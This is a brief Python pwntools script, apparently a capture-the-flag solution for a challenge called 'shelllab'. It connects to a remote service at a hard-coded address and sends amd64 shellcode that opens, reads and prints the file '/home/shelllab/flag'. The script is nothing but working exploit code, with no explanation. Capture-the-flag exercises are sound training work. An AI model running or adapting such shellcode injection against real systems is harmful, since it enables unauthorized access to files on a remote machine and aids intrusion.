from pwn import *

context.arch = 'amd64'

# p = process('./shelllab')
p = remote('140.112.31.97', 30101)

shellcode = asm(shellcraft.pushstr('/home/shelllab/flag')+shellcraft.open('rsp', 0, 0)+shellcraft.read('rax', 'rsp', 100)+shellcraft.write(1, 'rsp', 100))

p.sendline(shellcode)

p.interactive()
